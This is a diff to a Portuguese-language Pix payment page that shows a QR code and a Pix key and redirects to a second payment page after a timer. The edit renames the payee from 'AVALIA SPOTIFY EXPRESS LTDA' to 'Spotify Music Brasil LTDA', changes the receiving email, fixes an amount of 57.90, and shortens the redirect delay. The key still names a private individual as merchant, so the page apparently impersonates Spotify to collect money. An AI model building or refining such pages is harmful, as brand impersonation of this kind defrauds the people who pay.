@@ -230,11 +230,11 @@
         </div>
 
         <!-- QR Code do Pix -->
-        <img src="https://i.imgur.com/LXD9xVk.png" alt="QR Code Pix" class="qrcode-img" onclick="showQrCodeSuccess()">
+        <img src="https://i.imgur.com/Fg7ctNR.png" alt="QR Code Pix" class="qrcode-img" onclick="showQrCodeSuccess()">
 
         <!-- Chave PIX -->
         <div class="pix-key-box">
-            <p>Chave PIX: <span id="pix-key">00020126800014br.gov.bcb.pix0127avaliespotifyltda@gmail.com0227AVALIA SPOTIFY EXPRESS LTDA27600016BR.COM.PAGSEGURO0136043D0C40-58F5-4064-82B8-37EE70C3343E5204000053039865802BR5921claudio Jose da silva6009Sao Paulo62290525PAGS0000000002412282012856304E3F8</span></p>
+            <p>Chave PIX: <span id="pix-key">00020126740014br.gov.bcb.pix0123spotifyavalie@gmail.com0225Spotify Music Brasil LTDA27600016BR.COM.PAGSEGURO0136814957F1-15A5-47F0-9901-5ADBF0D4E7A7520400005303986540557.905802BR5921claudio Jose da silva6009Sao Paulo62290525PAGS00000579024123010187763048698</span></p>
             <span class="copy-icon" onclick="copyPixKey()">📋 Copiar</span>
         </div>
 
@@ -289,10 +289,10 @@
                     message.style.display = 'none';
                 }, 3000);
 
-                // Espera 4 minutos (240000 milissegundos) e redireciona
+                // Espera 3 minutos e redireciona
                 setTimeout(function() {
                     window.location.href = 'pagamento_pix2.html'; // Redirecionamento
-                }, 240000); // 4 minutos
+                }, 180000); // 3 minutos (3 * 60 * 1000 = 180000 milissegundos)
             }, function() {
                 alert('Erro ao copiar chave PIX');
             });
